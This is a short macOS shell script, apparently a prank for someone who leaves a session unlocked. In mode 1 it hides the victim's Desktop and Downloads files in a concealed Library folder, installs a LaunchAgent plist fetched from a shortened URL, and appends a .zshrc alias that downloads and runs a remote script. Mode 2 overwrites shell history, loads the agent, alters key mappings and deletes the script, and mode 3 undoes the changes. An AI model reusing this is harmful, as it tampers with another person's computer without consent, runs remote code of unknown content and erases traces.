#!/bin/sh

if [[ $1 -eq 1 ]]
then
	mkdir ~/.lmaktab ~/.ta7milat ~/.TIG
	mv ~/Desktop/* .lmaktab
	mv ~/Downloads/* .ta7milat
	mv ~/.lmaktab ~/.ta7milat ~/.TIG
	mv ~/.TIG ~/Library/Application\ Support/Knowledge
	curl -L -o com.local.hh.plist https://bit.ly/3IiFJij
	mv ~/com.local.hh.plist ~/Library/LaunchAgents
	curl -o hh.png https://i.imgur.com/okdA9yR.png
	mv hh.png ~/Desktop
	echo 'alias 69420="curl -L -o hh.sh https://bit.ly/3uqzOmD &>/dev/null; sh hh.sh 3"' >> ~/.zshrc

elif [[ $1 -eq 2 ]]
then
	echo "matb9ach tkhli session m7lola hhh" > ~/.zsh_history
	launchctl load ~/Library/LaunchAgents/com.local.hh.plist
	hidutil property --set '{"UserKeyMapping":[]}' reset hhhh
	launchctl start com.local.hh
	rm -rf hh.sh
elif [[ $1 -eq 3 ]]
then
	mv ~/Library/Application\ Support/Knowledge/.TIG/.lmaktab/* ~/Desktop
	mv ~/Library/Application\ Support/Knowledge/.TIG/.ta7milat/* ~/Downloads
	rm -rf ~/Library/Application\ Support/Knowledge/.TIG
	rm -rf ~/Library/LaunchAgents/com.local.hh.plist
	hidutil property --set '{"UserKeyMapping":[]}'
	sed -i '' -e '$ d' ~/.zshrc
	echo "matb9ach tkhli session m7lola hhh" > ~/.zsh_history
else
	echo "missing arg"
fi
